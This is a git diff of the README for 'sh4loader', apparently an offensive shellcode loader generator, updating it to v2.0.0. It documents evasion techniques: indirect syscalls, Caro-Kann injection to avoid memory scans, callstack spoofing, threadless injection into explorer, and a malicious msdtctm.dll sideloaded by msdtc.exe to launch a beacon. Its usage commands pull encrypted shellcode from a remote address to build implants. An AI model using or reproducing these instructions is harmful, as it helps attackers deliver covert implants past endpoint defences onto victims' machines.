@@ -1,20 +1,13 @@
-# This project is being refactored
-
-## TODO
-
-- no CRT
-- sleepobf
-- more stable
-- rewrite code
-
-# sh4loader
+# sh4loader v2.0.0
 
 <p align="center">
-<img src="https://raw.githubusercontent.com/Sh4N4C1/gitbook/main/images/sh4loader.png" alt="sh4loader">
+<img src="https://raw.githubusercontent.com/Sh4N4C1/gitbook/main/images/sh4loader_v2.png" alt="sh4loader_v2">
 </p>
 
 ## ✨ Function
 
+- **No CRT**
+- **Dll Sideload**
 - **Indirect Syscall**: sh4loader use `indirect` syscall.
 - **Caro Kann**: sh4loader use [Caro-Kann](https://github.com/S3cur3Th1sSh1t/Caro-Kann) injection to evade kernel triggered memory scans.
 - **Runtime Decrypt Shellcode**: sh4loader will bruteforce shellcode decryption key at runtime.
@@ -23,11 +16,8 @@
 
 ## Injection Method
 
-- Local Common Injection
-- Callstack spoof common Injection
-- Caro-Kann Callstack spoof common Injection
-- Caro-Kann threadless Injection
-- Caro-Kann callstack spoff threadless Injection
+- msdtc_dll 
+- threadless
 
 ## Install
 
@@ -47,15 +37,17 @@ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh # update rustc
 ## Usage
 
 ```bash
-sh4loader <injection-method> --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
+sh4loader -m msdtc_sideload -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project
+sh4loader -m threadless -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project
+sh4loader -m threadless -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project -r
 ```
 
 ## Detail
 
-### Caro-Kann Callstack spoof threadless Injection
+### threadless
 
 ```bash
-sh4loader kann-threadless-stack --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
+sh4loader -m threadless -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project -r # delete '-r' to use local injection
 ```
 
 This implant will find two memory, one for the `xor-encrypted main shellcode`, and one for the `Caro-Kann shellcode`. In threadless injection, it will first hook the target function, and then jump to the fixed shellcode to save the function state and then jump Go to Caro-Kann shellcode, Caro-Kann will help us decrypt and execute the main shellcode
@@ -79,58 +71,38 @@ This implant will find two memory, one for the `xor-encrypted main shellcode`, a
 
 1. During the execution of the implant, shellcode is patched to save the jump address.
 2. [Callstack spoof](https://github.com/pard0p/CallstackSpoofingPOC) means that NtAPI will be called using the TpReleaseWork proxy.
-3. The default function A and function B are `NtWaitForMultipleObjects` and `NtCreateWnfStateName` respectively. The default process is `RuntimeBroker`,because after using API Monitor I found that the RuntimeBroker process seems to call NtWaitForMultipleObjects every other time, and the NtCreateWnfStateName function is used to store the main shellcode.If you want to modify these default functions and processes, you can modify `include/KannThreadStackInj.h` in the implant project directory and Recompile with command `make KannThreadlessStackInj`
+3. The default function A and function B are `RtlNtStatusToDosError` and `NtCreateWnfStateName` respectively. The default process is `explorer`,because after using API Monitor I found that the explorer process seems to call RtlNtStatusToDosError every other time, and the NtCreateWnfStateName function is used to store the main shellcode.
 
-```c
-// include/KannThreadStackInj.h
-
-#define TARGET_PROCESS "RuntimeBroker.exe"      // Target process
-#define TARGET_FUNC_TWO "NtCreateWnfStateName"  // Function B
-#define TARGET_DLL "ntdll.dll"                  // Dll export Function A/B
-#define TARGET_FUNC "NtWaitForMultipleObjects"  // Function A
-```
-
-### Caro-Kann threadless Injection
+### msdtc_sideload
 
 ```bash
-sh4loader kann-threadless-stack --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
+sh4loader -m msdtc_sideload -u http://192.168.75.1/enc_shellcode.bin -p /tmp/shellcode.bin -o /tmp/project
 ```
 
-Same as above, but using indirect syscalls instead of proxy calls.
+Then put the generated msdtctm.dll and msdtc.exe in the same directory. The msdtc.exe from C:\Windows\System32 folder.
 
-### Caro-Kann Callstack spoof common Injection
-
-```bash
-sh4loader kann-spoofstacks --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
+```
+    [msdtc.exe]
+        |
+msdtctm.dll loaded for use `DtcMainExt` function    
+        |
+    [my evil msdtctm.dll]
+        |
+msdtc.exe lanuch evil `DtcMainExt` function
+        |
+    [ BEACON ]
 ```
 
-This Injection Method will use TpRelease proxy call `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtCreateThreadEx` to inject Caro-Kann shellcode and encrypted main shellcode into the local process.
-
-### Callstack spoof common Injection
-
-```bash
-sh4loader spoofstacks --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
-```
-
-This Injection Method will use TpRelease proxy call `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtCreateThreadEx` to inject main shellcode into the local process.
-
-### Local Common Injection
-
-```bash
-sh4loader common --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
-```
-
-This Injection Method just use indirect syscalls inject main shellcode into the local process.
 
 ## Resources
 
+- https://www.vulnlab.com/
+- https://maldevacademy.com/
 - https://github.com/pard0p/CallstackSpoofingPOC
 - https://github.com/CCob/ThreadlessInject
 - https://github.com/S3cur3Th1sSh1t/Caro-Kann
 - https://github.com/caueb/ThreadlessStompingKann
 - https://0xdarkvortex.dev/hiding-in-plainsight/
-- https://maldevacademy.com/
-- https://www.vulnlab.com/
 
 This is my first time writing a loader.I'm not some sort of expert on malware development, C, C++.I will be making a lot of mistakes,I hope that my coding skills get better and better
 
